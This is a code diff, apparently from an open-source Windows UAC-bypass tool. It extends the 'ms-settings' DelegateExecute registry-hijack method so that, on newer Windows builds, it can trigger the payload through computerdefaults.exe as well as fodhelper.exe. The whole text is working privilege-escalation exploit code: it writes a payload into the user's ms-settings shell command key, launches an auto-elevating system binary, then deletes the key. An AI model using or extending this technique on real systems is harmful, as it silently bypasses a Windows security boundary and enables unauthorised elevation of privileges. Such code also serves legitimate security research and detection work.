@@ -6,7 +6,7 @@
 *
 *  VERSION:     2.87
 *
-*  DATE:        19 Jan 2018
+*  DATE:        15 Apr 2018
 *
 *  Enigma0x3 autoelevation methods and everything based on the same
 *  ShellExecute related registry manipulations idea.
@@ -544,7 +544,7 @@ BOOL ucmSdcltIsolatedCommandMethod(
 * Overwrite Default value of ms-settings shell command with your payload.
 * Enable it with DelegateExecute value.
 *
-* Trigger: fodhelper.exe
+* Trigger: fodhelper.exe, computerdefaults.exe
 *
 */
 BOOL ucmMsSettingsDelegateExecuteMethod(
@@ -555,6 +555,7 @@ BOOL ucmMsSettingsDelegateExecuteMethod(
     DWORD   cbData;
     SIZE_T  sz = 0;
     LRESULT lResult;
+    LPWSTR lpTargetApp = NULL;
 #ifndef _WIN64
     PVOID   OldValue;
 #endif
@@ -569,7 +570,7 @@ BOOL ucmMsSettingsDelegateExecuteMethod(
     if (g_ctx.IsWow64) {
         if (!NT_SUCCESS(RtlWow64EnableFsRedirectionEx((PVOID)TRUE, &OldValue)))
             return FALSE;
-    }
+}
 #endif
 
     do {
@@ -613,7 +614,23 @@ BOOL ucmMsSettingsDelegateExecuteMethod(
 
         if (lResult == ERROR_SUCCESS) {
             _strcpy(szTempBuffer, g_ctx.szSystemDirectory);
-            _strcat(szTempBuffer, FODHELPER_EXE);
+
+            //
+            // Not because it was fixed but because this was added in RS4 _additionaly_
+            //
+            lpTargetApp = FODHELPER_EXE;
+
+            if (g_ctx.dwBuildNumber > 16299) {
+
+                if (IDYES == ucmShowQuestion(
+                    TEXT("Would you like to use this method with ComputerDefaults.exe (YES) or Fodhelper.exe (NO)?")))
+                {
+                    lpTargetApp = COMPUTERDEFAULTS_EXE;
+                }
+            }
+
+            _strcat(szTempBuffer, lpTargetApp);
+
             bResult = supRunProcess(szTempBuffer, NULL);
             supDeleteKeyRecursive(HKEY_CURRENT_USER, T_MSSETTINGS);
         }
